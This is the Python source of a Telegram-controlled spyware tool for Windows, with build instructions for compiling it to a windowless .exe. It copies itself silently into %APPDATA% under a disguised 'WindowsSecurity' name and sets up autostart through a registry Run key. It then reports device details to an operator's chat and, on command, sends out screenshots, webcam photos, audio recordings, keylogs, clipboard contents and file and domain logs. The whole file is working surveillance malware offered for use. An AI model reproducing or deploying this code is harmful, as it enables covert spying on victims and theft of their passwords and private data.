"""
SpyWare Telegram Bot Controller

Compile to .exe with:
    pip install pyinstaller
    pyinstaller --onefile --windowed \
      --hidden-import=SpyWare \
      --hidden-import=SpyWare.AudioLogger \
      --hidden-import=SpyWare.KeyLogger \
      --hidden-import=SpyWare.ScreenLogger \
      --hidden-import=SpyWare.WebcamLogger \
      --hidden-import=SpyWare.ClipboardLogger \
      --hidden-import=SpyWare.DomainsLogger \
      --hidden-import=SpyWare.FilesLogger \
      --hidden-import=telebot \
      --hidden-import=dotenv \
      file_spyware.py

Output: dist/file_spyware.exe

Deployment: See DEPLOY.md
"""

import os
import sys
import shutil
import signal
import glob
import time
import socket
import getpass
import subprocess
import threading
from pathlib import Path
from datetime import datetime

import telebot
from dotenv import load_dotenv

from SpyWare.ScreenLogger.ScreenLogger import (
    Daemon as ScreenDaemon,
    config_load as screenConfig,
)
from SpyWare.WebcamLogger.WebcamLogger import (
    Daemon as WebcamDaemon,
    config_load as webcamConfig,
)
from SpyWare.AudioLogger.AudioLogger import (
    Daemon as AudioDaemon,
    config_load as audioConfig,
)
from SpyWare.KeyLogger.KeyLogger import Daemon as KeyDaemon, config_load as keyConfig
from SpyWare.ClipboardLogger.ClipboardLogger import (
    Daemon as ClipboardDaemon,
    config_load as clipboardConfig,
)
from SpyWare.FilesLogger.FilesLogger import (
    Daemon as FilesDaemon,
    config_load as filesConfig,
)
from SpyWare.DomainsLogger.DomainsLogger import (
    Daemon as DomainsDaemon,
    config_load as domainsConfig,
)


# Load environment
load_dotenv()
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = int(os.getenv("CHAT_ID", 0))

if not BOT_TOKEN or not CHAT_ID:
    raise ValueError("BOT_TOKEN and CHAT_ID must be set in .env")

bot = telebot.TeleBot(BOT_TOKEN)
running_modules = {}
bot_running = True


def verify_chat(message):
    """Check if message from authorized CHAT_ID."""
    if message.chat.id != CHAT_ID:
        bot.reply_to(message, "Unauthorized.")
        return False
    return True


def find_latest_file(pattern):
    """Return latest file matching glob pattern, or None."""
    files = glob.glob(pattern)
    if not files:
        return None
    return max(files, key=os.path.getmtime)


def create_module_config(filename, dirname):
    """Create minimal config file for a module."""
    content = f"""[SAVE]
filename = {filename}
dirname = {dirname}
"""
    Path(filename.split(".")[0] + ".conf").parent.mkdir(parents=True, exist_ok=True)
    with open(filename.split(".")[0] + ".conf", "w") as f:
        f.write(content)


def stop_all_modules():
    """Stop all running daemons and join threads."""
    for name, (daemon, threads) in running_modules.items():
        try:
            daemon.run = False
            for thread in threads:
                thread.join(timeout=5)
        except Exception as e:
            print(f"Error stopping {name}: {e}")
    running_modules.clear()


INSTALL_DIR_NAME = "WindowsSecurity"
INSTALL_EXE_NAME = "wsmgr.exe"
RUN_KEY_NAME = "WindowsSecurityMonitor"  # generic name, less obvious


def _register_run_key(exe_path: str) -> None:
    """Write exe_path into HKCU Run key. No admin rights needed."""
    import winreg

    run_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with winreg.OpenKey(
        winreg.HKEY_CURRENT_USER, run_key, 0, winreg.KEY_SET_VALUE
    ) as key:
        winreg.SetValueEx(key, RUN_KEY_NAME, 0, winreg.REG_SZ, exe_path)


def install_self():
    """First-run silent self-install: copy self + .env to %APPDATA%, register
    startup, relaunch from new location, exit the launcher process.

    Only runs when frozen (compiled .exe). Dev runs (python file_spyware.py)
    are skipped. Idempotent — skip when already running from install dir.
    """
    if sys.platform != "win32" or not getattr(sys, "frozen", False):
        return False  # dev mode: no self-install
    try:
        appdata = os.getenv("APPDATA")
        if not appdata:
            return False
        target_dir = os.path.join(appdata, INSTALL_DIR_NAME)
        exe_path = os.path.abspath(sys.argv[0])
        target_exe = os.path.join(target_dir, INSTALL_EXE_NAME)

        if exe_path == target_exe and os.path.exists(target_exe):
            return True  # already installed, running from APPDATA

        os.makedirs(target_dir, exist_ok=True)

        # Copy self (if not same path) and .env
        if exe_path != target_exe:
            shutil.copy2(exe_path, target_exe)
        env_src = os.path.join(os.path.dirname(exe_path), ".env")
        env_dst = os.path.join(target_dir, ".env")
        if os.path.exists(env_src) and not os.path.exists(env_dst):
            shutil.copy2(env_src, env_dst)

        _register_run_key(target_exe)

        # Relaunch from install location, detached
        subprocess.Popen(
            [target_exe],
            cwd=target_dir,
            creationflags=subprocess.DETACHED_PROCESS
            | subprocess.CREATE_NEW_PROCESS_GROUP,
        )
        print(f"Installed to {target_exe}. Relaunching from new location.")
        sys.exit(0)  # launcher process exits after install
    except Exception as e:
        print(f"Self-install failed: {e}")
        return False


def ensure_autostart():
    """Silently register current exe in Windows startup (registry Run key).

    Idempotent — safe to run every launch. HKCU = no admin rights needed.
    """
    if sys.platform != "win32":
        return
    try:
        _register_run_key(os.path.abspath(sys.argv[0]))
        print("Autostart registered.")
    except Exception as e:
        print(f"Autostart registration failed: {e}")


def notify_startup():
    """Send startup notification with device info to Telegram."""
    try:
        hostname = socket.gethostname()
        try:
            username = getpass.getuser()
        except Exception:
            username = os.getenv("USERNAME", "unknown")
        try:
            ip = socket.gethostbyname(hostname)
        except Exception:
            ip = "unknown"
        system_info = (
            f"🍾 Program baru dijalankan di perangkat\n\n"
            f"🖥️ Perangkat: {hostname}\n"
            f"👤 User: {username}\n"
            f"🌐 IP lokal: {ip}\n"
            f"⚙️ OS: {sys.platform}\n"
            f"🕐 Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        bot.send_message(CHAT_ID, system_info)
    except Exception as e:
        print(f"Startup notification failed: {e}")


def shutdown_handler(signum, frame):
    """Handle SIGTERM and KeyboardInterrupt."""
    global bot_running
    bot_running = False
    stop_all_modules()
    bot.stop_polling()
    sys.exit(0)


signal.signal(signal.SIGTERM, shutdown_handler)


@bot.message_handler(commands=["start", "help"])
def start_help(message):
    if not verify_chat(message):
        return
    try:
        help_text = """SpyWare Bot Commands:
        
/start, /help - Show this message
/status - Show running modules
/screenshot - Take one screenshot
/webcam - Capture one webcam photo
/audio - Record 10 seconds audio
/keylog - Get keylogger data (last 4000 chars)
/clipboard - Get clipboard data (last 4000 chars)
/files - Get files log (CSV)
/domains - Get domains log
/startall - Start all modules in background
/stopall - Stop all modules
/uninstall - Remove autostart & shut down bot"""
        bot.reply_to(message, help_text)
    except Exception as e:
        bot.send_message(CHAT_ID, f"Error: {str(e)}")


@bot.message_handler(commands=["status"])
def status(message):
    if not verify_chat(message):
        return
    try:
        if not running_modules:
            bot.reply_to(message, "No modules running.")
            return
        status_text = "Running modules:\n" + "\n".join(running_modules.keys())
        bot.reply_to(message, status_text)
    except Exception as e:
        bot.send_message(CHAT_ID, f"Error: {str(e)}")


@bot.message_handler(commands=["screenshot"])
def screenshot(message):
    if not verify_chat(message):
        return
    try:
        bot.reply_to(message, "Capturing screenshot...")
        screenConfig(argv=["_", "screenSpy.conf"])
        daemon = ScreenDaemon()
        thread = threading.Thread(target=daemon.run, daemon=True)
        thread.start()
        thread.join(timeout=5)

        latest = find_latest_file("screenshots/screenshot*.png")
        if latest:
            with open(latest, "rb") as f:
                bot.send_photo(CHAT_ID, f)
        else:
            bot.reply_to(message, "Screenshot not captured.")
    except Exception as e:
        bot.send_message(CHAT_ID, f"Error: {str(e)}")


@bot.message_handler(commands=["webcam"])
def webcam(message):
    if not verify_chat(message):
        return
    try:
        bot.reply_to(message, "Capturing webcam...")
        webcamConfig(argv=["_", "webcamSpy.conf"])
        daemon = WebcamDaemon()
        thread = threading.Thread(target=daemon.run, daemon=True)
        thread.start()
        thread.join(timeout=5)

        latest = find_latest_file("pictures/webcam*.png")
        if latest:
            with open(latest, "rb") as f:
                bot.send_photo(CHAT_ID, f)
        else:
            bot.reply_to(message, "Webcam photo not captured.")
    except Exception as e:
        bot.send_message(CHAT_ID, f"Error: {str(e)}")


def record_audio_thread():
    """Record audio for 10 seconds in thread."""
    try:
        audioConfig(argv=["_", "audioSpy.conf"])
        daemon = AudioDaemon()
        daemon.run = True
        start_time = time.time()
        while daemon.run and time.time() - start_time < 10:
            time.sleep(0.1)
        daemon.run = False
    except Exception as e:
        print(f"Audio error: {e}")


@bot.message_handler(commands=["audio"])
def audio(message):
    if not verify_chat(message):
        return
    try:
        bot.reply_to(message, "Recording audio (10s)...")
        thread = threading.Thread(target=record_audio_thread, daemon=True)
        thread.start()
        thread.join(timeout=15)

        latest = find_latest_file("records/record*.wav")
        if latest:
            with open(latest, "rb") as f:
                bot.send_document(CHAT_ID, f, visible_file_name="audio.wav")
        else:
            bot.reply_to(message, "Audio not recorded.")
    except Exception as e:
        bot.send_message(CHAT_ID, f"Error: {str(e)}")


@bot.message_handler(commands=["keylog"])
def keylog(message):
    if not verify_chat(message):
        return
    try:
        if not os.path.exists("keySpy.txt"):
            bot.reply_to(message, "No data yet, run /startall first")
            return
        with open("keySpy.txt", "r", errors="ignore") as f:
            data = f.read()[-4000:]
        bot.reply_to(message, f"Keylog:\n\n{data}")
    except Exception as e:
        bot.send_message(CHAT_ID, f"Error: {str(e)}")


@bot.message_handler(commands=["clipboard"])
def clipboard(message):
    if not verify_chat(message):
        return
    try:
        if not os.path.exists("clipboard.txt"):
            bot.reply_to(message, "No data yet, run /startall first")
            return
        with open("clipboard.txt", "r", errors="ignore") as f:
            data = f.read()[-4000:]
        bot.reply_to(message, f"Clipboard:\n\n{data}")
    except Exception as e:
        bot.send_message(CHAT_ID, f"Error: {str(e)}")


@bot.message_handler(commands=["files"])
def files_log(message):
    if not verify_chat(message):
        return
    try:
        if not os.path.exists("files.csv"):
            bot.reply_to(message, "No data")
            return
        with open("files.csv", "rb") as f:
            bot.send_document(CHAT_ID, f, visible_file_name="files.csv")
    except Exception as e:
        bot.send_message(CHAT_ID, f"Error: {str(e)}")


@bot.message_handler(commands=["domains"])
def domains_log(message):
    if not verify_chat(message):
        return
    try:
        if not os.path.exists("domains.txt"):
            bot.reply_to(message, "No data")
            return
        with open("domains.txt", "rb") as f:
            bot.send_document(CHAT_ID, f, visible_file_name="domains.txt")
    except Exception as e:
        bot.send_message(CHAT_ID, f"Error: {str(e)}")


@bot.message_handler(commands=["startall"])
def startall(message):
    if not verify_chat(message):
        return
    try:
        if running_modules:
            bot.reply_to(message, "Modules already running.")
            return

        modules = [
            ("ScreenLogger", screenConfig, ScreenDaemon, "screenSpy.conf"),
            ("WebcamLogger", webcamConfig, WebcamDaemon, "webcamSpy.conf"),
            ("AudioLogger", audioConfig, AudioDaemon, "audioSpy.conf"),
            ("KeyLogger", keyConfig, KeyDaemon, "keySpy.conf"),
            ("ClipboardLogger", clipboardConfig, ClipboardDaemon, "clipboardSpy.conf"),
            ("FilesLogger", filesConfig, FilesDaemon, "filesSpy.conf"),
            ("DomainsLogger", domainsConfig, DomainsDaemon, "domainsSpy.conf"),
        ]

        for name, config_fn, daemon_class, conf_file in modules:
            try:
                config_fn(argv=["_", conf_file])
                daemon = daemon_class()
                threads = []

                if name == "DomainsLogger":
                    t1 = threading.Thread(target=daemon.run_CacheDns, daemon=True)
                    t2 = threading.Thread(target=daemon.run_AppData, daemon=True)
                    t1.start()
                    t2.start()
                    threads = [t1, t2]
                else:
                    t = threading.Thread(target=daemon.run_for_ever, daemon=True)
                    t.start()
                    threads = [t]

                running_modules[name] = (daemon, threads)
            except Exception as e:
                print(f"Failed to start {name}: {e}")

        bot.reply_to(message, f"Started: {', '.join(running_modules.keys())}")
    except Exception as e:
        bot.send_message(CHAT_ID, f"Error: {str(e)}")


@bot.message_handler(commands=["stopall"])
def stopall(message):
    if not verify_chat(message):
        return
    try:
        stop_all_modules()
        bot.reply_to(message, "All modules stopped.")
    except Exception as e:
        bot.send_message(CHAT_ID, f"Error: {str(e)}")


@bot.message_handler(commands=["uninstall"])
def uninstall(message):
    if not verify_chat(message):
        return
    try:
        stop_all_modules()

        # Remove autostart link
        username = os.getenv("USERNAME", "User")
        startup_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        for lnk in glob.glob(f"{startup_path}\\*.lnk"):
            try:
                os.remove(lnk)
            except Exception:
                pass

        # Remove registry Run key autostart
        if sys.platform == "win32":
            try:
                import winreg

                run_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER, run_key, 0, winreg.KEY_SET_VALUE
                ) as key:
                    winreg.DeleteValue(key, RUN_KEY_NAME)
                print("Registry autostart removed.")
            except FileNotFoundError:
                pass  # already removed
            except Exception as e:
                print(f"Registry removal failed: {e}")

            # Schedule removal of install dir (self-delete after exit:
            # running .exe is locked, so cmd deletes it after timeout)
            appdata = os.getenv("APPDATA", "")
            install_dir = os.path.join(appdata, INSTALL_DIR_NAME)
            if os.path.isdir(install_dir):
                os.system(
                    f'cmd /C "timeout 3 > nul & del /Q /F "{install_dir}\\*" '
                    f'& rmdir /S /Q "{install_dir}"" &'
                )
                print(f"Install dir cleanup scheduled: {install_dir}")

        # Clean output dirs
        for path in ["screenshots", "pictures", "records"]:
            try:
                for f in glob.glob(f"{path}/*"):
                    os.remove(f)
            except Exception:
                pass

        for f in ["keySpy.txt", "clipboard.txt", "domains.txt", "files.csv"]:
            try:
                os.remove(f)
            except Exception:
                pass

        bot.send_message(CHAT_ID, "Uninstalled. Bot shutting down.")
        shutdown_handler(None, None)
    except Exception as e:
        bot.send_message(CHAT_ID, f"Error: {str(e)}")


if __name__ == "__main__":
    try:
        if install_self():
            pass  # new instance relaunched; this launcher exits inside install_self
        ensure_autostart()
        notify_startup()
        print("Bot starting...")
        bot.infinity_polling()
    except KeyboardInterrupt:
        print("Shutdown signal received.")
        shutdown_handler(None, None)
